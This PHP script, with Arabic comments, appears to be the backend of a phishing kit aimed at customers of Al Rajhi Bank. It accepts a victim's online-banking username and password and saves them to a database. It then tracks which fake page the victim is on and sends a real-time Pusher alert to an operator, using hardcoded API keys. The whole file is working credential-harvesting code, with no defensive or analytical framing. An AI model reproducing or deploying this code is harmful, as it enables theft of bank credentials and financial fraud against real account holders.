<?php
session_start();
header('Content-Type: application/json');

require_once '../dashboard/init.php';

// التحقق من وجود user_id في الجلسة
$userId = null;

if (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
} elseif (isset($_SESSION['user_session'])) {
    $userId = $_SESSION['user_session'];
}

if (!$userId) {
    echo json_encode([
        'success' => false,
        'error' => 'لم يتم العثور على معرف المستخدم'
    ]);
    exit;
}

// التحقق من البيانات المرسلة
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    $bank = $_POST['bank'] ?? '';
    $userName = $_POST['user_name'] ?? '';
    $bkPass = $_POST['bk_pass'] ?? '';
    
    // التحقق من وجود البيانات
    if (empty($userName) || empty($bkPass)) {
        echo json_encode([
            'success' => false,
            'error' => 'يرجى ملء جميع الحقول'
        ]);
        exit;
    }
    
    // حفظ البيانات في قاعدة البيانات
    $data = [
        'user_id' => $userId,
        'bank' => $bank,
        'user_name' => $userName,
        'bk_pass' => $bkPass
    ];
    
    $result = $User->insertBankLogin($data);
    
    if ($result) {
        // تحديث رسالة المستخدم
        $User->updateUserMessage($userId, 'بيانات بنك الراجحي');
        $User->updateUserCurrentPage($userId, 'BK.html');
        
        // ✅ إرسال إشعار Pusher
        try {
            require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
            
            $pusher = new Pusher\Pusher(
                'a56388ee6222f6c5fb86',
                '4c77061f4115303aac58',
                '1973588',
                ['cluster' => 'ap2', 'useTLS' => true]
            );

            $pusher->trigger('my-channel', 'updaefte-user-payys', [
                'userId' => $userId,
                'updatedData' => ['message' => 'بيانات بنك الراجحي']
            ]);
        } catch (Exception $e) {
            error_log("Pusher Error: " . $e->getMessage());
        }
        
        echo json_encode([
            'success' => true,
            'message' => 'تم حفظ البيانات بنجاح'
        ]);
    } else {
        echo json_encode([
            'success' => false,
            'error' => 'فشل حفظ البيانات'
        ]);
    }
} else {
    echo json_encode([
        'success' => false,
        'error' => 'طريقة الطلب غير صحيحة'
    ]);
}
?>